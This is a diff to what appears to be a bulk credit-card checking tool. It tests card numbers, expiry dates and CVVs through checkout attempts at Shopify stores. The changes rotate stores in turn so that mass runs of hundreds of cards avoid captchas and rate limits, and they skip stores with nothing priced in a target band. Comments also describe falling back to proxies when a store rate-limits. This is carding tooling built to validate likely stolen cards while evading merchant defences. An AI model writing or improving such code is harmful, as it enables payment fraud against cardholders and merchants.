@@ -611,6 +611,10 @@ _site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
 
 _product_cache: dict[str, dict] = {}
 
+# Which store gets the next check.  The stores take turns, so a mass
+# run is spread over them.
+_site_turn = 0
+
 # One product fetch per store at a time.  Without this, every worker
 # that starts at the same moment asks the store for its product list
 # and the store answers none of them -- the product endpoint is the
@@ -2385,6 +2389,32 @@ async def validate_card_with_retry(
     }
 
 
+def _site_has_product_in_band(site: str, min_price: float, max_price: float) -> bool:
+    """True when the store has something to sell inside the band.
+
+    Nothing is known about a store that was never asked, so it is given
+    the chance.  A store whose product list is known and has nothing
+    inside the band is skipped: asking it again would only end in the
+    same answer.
+    """
+    base = site if site.startswith("http") else "https://" + site
+    hostname = urlparse(base).netloc
+    entry = _product_cache.get(f"{hostname}|{max_price:.2f}")
+    if not entry:
+        return True
+    candidates = entry.get("candidates") or []
+    if not candidates:
+        return False
+    for c in candidates:
+        try:
+            price = float(c.get("price"))
+        except (TypeError, ValueError):
+            continue
+        if min_price <= price <= max_price:
+            return True
+    return False
+
+
 async def validate_card_across_sites(
     cc:         str,
     month:      str,
@@ -2403,6 +2433,13 @@ async def validate_card_across_sites(
     """
     last: Optional[dict] = None
     for site in sites[:max_sites]:
+        # A store that has nothing to sell inside the band is skipped
+        # without a checkout attempt.  The product list is cached per
+        # store and band, so this is known after the first card.
+        if min_price and not _site_has_product_in_band(
+            site, float(min_price), float(max_price if max_price is not None else MAX_PRICE)
+        ):
+            continue
         # The normal route first: it is the fastest one and it is the
         # one that works until a store rate limits us.  Only then is the
         # check repeated through a proxy, which leaves from another
@@ -2513,10 +2550,11 @@ async def shopify_route(
             )
         card = random.choice(cards)
 
-    # The shop the caller names comes first, so the check goes straight
-    # to the shop that answered last time.  The rest of the shops stay
-    # behind it: a shop with nothing of that price is one step, not the
-    # end of the road.
+    # The stores are asked in turn.  A mass run sends hundreds of cards
+    # at the same time, and a shop that gets every one of them puts up a
+    # captcha and the whole run crawls.  Taking the shops in turns gives
+    # every one of them a share, and the store that answered last is one
+    # of them again soon.
     named = [s.strip() for s in site.split(",") if s.strip()] if site else []
     sites = _load_sites_from_file()
     if not named and not sites:
@@ -2526,8 +2564,13 @@ async def shopify_route(
         )
     # The stores that are cooling down are asked last.
     rest = [s for s in _stores_ready(sites) if s not in named]
-    random.shuffle(rest)
-    sites = named + rest
+    pool = named + rest
+    if pool:
+        global _site_turn
+        offset = _site_turn % len(pool)
+        pool = pool[offset:] + pool[:offset]
+        _site_turn += 1
+    sites = pool
 
     result = await validate_card_across_sites(
         card["cc"], card["month"], card["year"], card["cvv"],
